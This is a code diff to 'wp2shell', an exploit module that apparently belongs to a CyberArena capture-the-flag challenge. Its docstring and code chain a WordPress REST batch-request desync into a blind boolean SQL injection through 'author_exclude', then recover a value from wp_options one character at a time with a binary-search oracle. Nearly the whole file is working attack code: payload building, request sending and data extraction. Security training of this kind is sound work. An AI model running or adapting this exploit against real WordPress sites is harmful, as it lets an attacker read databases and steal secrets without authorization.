@@ -1,100 +1,143 @@
 """Exploit-side HTTP helpers for wp2shell.
 
-Builds and sends the 3-entry `/wp-json/batch/v1` payload that chains
-CVE-2026-63030 (batch `$matches[]`/`$requests[]` desync in
-`serve_batch_request_v1()`) into CVE-2026-60137 (unauthenticated SQLi via
-`WP_Query`'s `author__not_in`).
+The useful primitive is a blind SQL injection in the REST posts collection
+query. The REST controller asks `WP_Query` for post IDs, so a UNION row does not
+come back as JSON. Instead, the exploit asks boolean questions and observes
+whether the posts list returns any rows.
 
-Construction (see `_maintainer/README.md` for the full source-level
-derivation):
+The request still goes through the intended batch desync:
 
-  index 0 — path `":"`. `wp_parse_url(":")` fails (a bare colon, no leading
-            `/`, so wp_parse_url's own `//`/`/`-prefix rewrite doesn't kick
-            in before the native `parse_url()` call). The failure is pushed
-            to `$validation[]` but NOT `$matches[]` — the array desync.
-  index 1 — path `/wp/v2/widgets`, one of only two REST controllers with
-            `allow_batch` enabled (posts is the other), carrying the raw
-            SQLi string on a query key (`author_exclude`) the widgets
-            collection schema does not declare. Because it's unrecognized by
-            THIS request's own matched schema, `sanitize_params()` never
-            touches it — it survives verbatim in the request's param bag.
-            This is the entry that actually gets dispatched at slot 1 of the
-            desynced `$matches[]` array — i.e. under index 2's handler.
-  index 2 — path `/wp/v2/posts`. Never meaningfully executed as its OWN
-            top-level entry (its `$matches[2]` slot is now out of range); its
-            only purpose is to be the SECOND push into `$matches[]`, so that
-            `$matches[1]` (what index 1 reads) is REALLY this entry's
-            `[route, handler]` — the real posts collection GET
-            callback + schema. Index 1's request object (still carrying its
-            own unsanitized `author_exclude`) is then dispatched THROUGH that
-            borrowed posts callback, reaching `WP_Query` with a raw string.
+  index 0 -- malformed path, creating the `$requests` / `$matches` offset
+  index 1 -- widgets request carrying an unsanitized `author_exclude` query arg
+  index 2 -- posts request donating the public posts-list GET handler
 
-The injected `author_exclude` value closes the `NOT IN (...)` parenthesis and
-UNION-selects a synthetic 23-column `wp_posts` row (the real column count/
-order, confirmed against `wp-admin/includes/schema.php`) whose `post_content`
-carries the target `wp_options.option_value`. The synthetic row surfaces in
-index 1's response body (the posts-listing JSON, since it ran under the
-posts callback) — this module looks for it there.
+The vulnerable image widens `/batch/v1` to allow GET subrequests. Without that
+challenge-side vulnerable surface, stock WordPress rejects GET during the batch
+schema check before the desync can reach the posts-list handler.
 """
 from __future__ import annotations
 
-import re
-import uuid
+import http.client
+import json
+import string
+import urllib.parse
 
-import httpx
+MALFORMED_PATH = ":"
+CARRIER_PATH = "/wp/v2/widgets"
+DONOR_PATH = "/wp/v2/posts"
 
-MALFORMED_PATH = ":"          # index 0 — deliberately fails wp_parse_url()
-CARRIER_PATH = "/wp/v2/widgets"   # index 1 — carries the raw injection
-DONOR_PATH = "/wp/v2/posts"       # index 2 — donates its handler via the desync
-
-
-def _union_payload(option_name: str, marker: str) -> str:
-    """23-column UNION matching wp_posts' real column list/order. post_content
-    (column 5) carries the exfiltrated option_value; post_name (column 12) is
-    the caller-chosen `marker` used to find this synthetic row in the
-    response JSON without guessing at ID collisions."""
-    sub = f"(SELECT option_value FROM wp_options WHERE option_name='{option_name}')"
-    cols = [
-        "1", "1", "NOW()", "NOW()", sub, "'wp2shell-exfil'", "''",
-        "'publish'", "'open'", "'open'", "''", f"'{marker}'", "''", "''",
-        "NOW()", "NOW()", "''", "0", "''", "0", "'post'", "''", "0",
-    ]
-    assert len(cols) == 23, "wp_posts has exactly 23 columns"
-    return "0) UNION ALL SELECT " + ",".join(cols) + "-- -"
+FLAG_PREFIX = "FLAG{"
+FLAG_BODY_LEN = 32
+FLAG_SUFFIX = "}"
+FLAG_BODY_ALPHABET = string.ascii_uppercase + string.digits
 
 
-def build_batch_payload(option_name: str, marker: str) -> dict:
-    injection = _union_payload(option_name, marker)
+def _sql_string(value: str) -> str:
+    return "'" + value.replace("'", "''") + "'"
+
+
+def _base_parts(base_url: str) -> tuple[str, int, str]:
+    if "://" not in base_url:
+        base_url = "http://" + base_url
+    parsed = urllib.parse.urlsplit(base_url)
+    if parsed.scheme != "http" or not parsed.hostname:
+        raise ValueError(f"unsupported base URL: {base_url!r}")
+    port = parsed.port or 80
+    prefix = parsed.path.rstrip("/")
+    return parsed.hostname, port, prefix
+
+
+def build_batch_payload(predicate: str) -> dict:
+    injection = f"0) AND ({predicate})-- -"
+    query = urllib.parse.urlencode({"author_exclude": injection})
     return {
+        "validation": "normal",
         "requests": [
-            {"path": MALFORMED_PATH},
-            {"path": CARRIER_PATH, "query": {"author_exclude": injection}},
-            {"path": DONOR_PATH},
-        ]
+            {"path": MALFORMED_PATH, "method": "GET"},
+            {"path": f"{CARRIER_PATH}?{query}", "method": "GET"},
+            {"path": DONOR_PATH, "method": "GET"},
+        ],
     }
 
 
-def steal_option(base_url: str, option_name: str, *, timeout: float = 15.0) -> str | None:
-    """Send the chained batch request and pull `option_name`'s value out of
-    the synthetic UNION row. Returns None if the chain didn't yield it
-    (patched box, or the reconstructed request shape needs adjustment — see
-    the honesty note in `_maintainer/README.md`)."""
-    marker = f"wp2shell-exfil-{uuid.uuid4().hex[:12]}"
-    payload = build_batch_payload(option_name, marker)
-    with httpx.Client(timeout=timeout) as c:
-        r = c.post(f"{base_url}/wp-json/batch/v1", json=payload)
-        r.raise_for_status()
-        body_text = r.text
+def _post_batch(base_url: str, payload: dict, *, timeout: float) -> dict | None:
+    host, port, prefix = _base_parts(base_url)
+    conn = http.client.HTTPConnection(host, port, timeout=timeout)
+    try:
+        conn.request(
+            "POST",
+            f"{prefix}/wp-json/batch/v1",
+            body=json.dumps(payload).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+        )
+        resp = conn.getresponse()
+        raw = resp.read().decode("utf-8", errors="replace")
+    finally:
+        conn.close()
+    try:
+        obj = json.loads(raw)
+    except json.JSONDecodeError:
+        return None
+    return obj if isinstance(obj, dict) else None
 
-    # Don't assume an exact JSON shape for the borrowed-callback response —
-    # just anchor on our own marker and pull the content field near it.
-    idx = body_text.find(marker)
-    if idx == -1:
+
+def _probe(base_url: str, predicate: str, *, timeout: float) -> bool:
+    obj = _post_batch(base_url, build_batch_payload(predicate), timeout=timeout)
+    responses = obj.get("responses") if isinstance(obj, dict) else None
+    if not isinstance(responses, list) or len(responses) < 2:
+        return False
+    carried = responses[1]
+    if not isinstance(carried, dict) or carried.get("status") != 200:
+        return False
+    headers = carried.get("headers") if isinstance(carried.get("headers"), dict) else {}
+    try:
+        return int(headers.get("X-WP-Total") or 0) > 0
+    except (TypeError, ValueError):
+        body = carried.get("body")
+        return isinstance(body, list) and len(body) > 0
+
+
+def _ascii_le_predicate(option_name: str, position: int, value: int) -> str:
+    option = _sql_string(option_name)
+    return (
+        "ASCII(SUBSTRING("
+        f"(SELECT option_value FROM wp_options WHERE option_name={option}),"
+        f"{position},1))<={value}"
+    )
+
+
+def _recover_char(base_url: str, option_name: str, position: int,
+                  *, timeout: float) -> str | None:
+    lo, hi = 48, 90
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if _probe(base_url, _ascii_le_predicate(option_name, position, mid),
+                  timeout=timeout):
+            hi = mid
+        else:
+            lo = mid + 1
+    ch = chr(lo)
+    return ch if ch in FLAG_BODY_ALPHABET else None
+
+
+def steal_option(base_url: str, option_name: str, *, timeout: float = 8.0) -> str | None:
+    """Blind-read the standard CyberArena flag from `wp_options`.
+
+    Returns None when the target is reachable but the oracle is unavailable,
+    which is the expected result after a defender fixes either half of the
+    chain.
+    """
+    if not _probe(base_url, "1=1", timeout=timeout):
         return None
-    window = body_text[max(0, idx - 4000):idx]
-    m = re.search(r'"post_content"\s*:\s*"((?:[^"\\]|\\.)*)"', window)
-    if not m:
-        m = re.search(r'"rendered"\s*:\s*"((?:[^"\\]|\\.)*)"', window)
-    if not m:
+    if _probe(base_url, "1=0", timeout=timeout):
         return None
-    return m.group(1).encode().decode("unicode_escape")
+
+    body = []
+    start = len(FLAG_PREFIX) + 1
+    stop = start + FLAG_BODY_LEN
+    for position in range(start, stop):
+        ch = _recover_char(base_url, option_name, position, timeout=timeout)
+        if ch is None:
+            return None
+        body.append(ch)
+    return f"{FLAG_PREFIX}{''.join(body)}{FLAG_SUFFIX}"
